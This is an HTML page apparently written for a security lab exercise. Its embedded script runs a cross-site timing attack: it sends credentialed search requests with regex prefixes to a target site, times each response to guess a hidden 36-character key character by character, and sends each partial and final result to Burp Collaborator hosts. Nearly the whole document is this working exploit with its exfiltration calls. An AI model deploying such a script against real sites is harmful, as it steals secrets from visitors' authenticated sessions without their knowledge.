<!DOCTYPE html>
<html>
  <head>
  </head>
  <body>
    <ul id="secrets"></ul>

<script>

(async ()=>{
    function sendKey(k)
    {
        console.log("sendKey:"+k)
        
    //    var ul= document.getElementById("secrets");
    //    var li = document.createElement("img");
    //    li.src = "http://s81a9uym9ibodhw899ouoeei89e02p.burpcollaborator.net?key="+k
    //    ul.appendChild(li);
        try {
            fetch("http://qqkxpek9c8g1z17v3kas595rqiw8kx.burpcollaborator.net?key="+k)
        } catch(e) {
            console.log("AA"+e);
        }
    };
    sendKey("Started")

    key = ""
    while (key.length < 3) {
        chars="0123456789-abcdef"
        bFound=false
        for (var i = 0; i < chars.length; i++) {
            char = chars.charAt(i)
            tk = key+char
            let before = performance.now()
            try {
                await fetch("http://ptl-ff8dcea2-d4247c35.libcurl.so/search?search=^"+tk, {
                    credentials: 'include'
                })
            }
            catch(e) {
                console.log("BB"+e);
            }
            let request_time = performance.now() - before
            console.log("tk:"+tk+":"+request_time)
            if (request_time > 3300) {
                if (tk.length == 36) {
                    sendKey("FINAL:"+tk)
                    return
                } else {
                    sendKey("rt:"+request_time+"INT:"+tk)
                    key=tk
                    i=chars.length+1
                }
                bFound=true
            }
        }
        if (bFound == false) {
            break
        }
    }
    sendKey("finished:"+key)
})();

</script>
  </body>
</html>
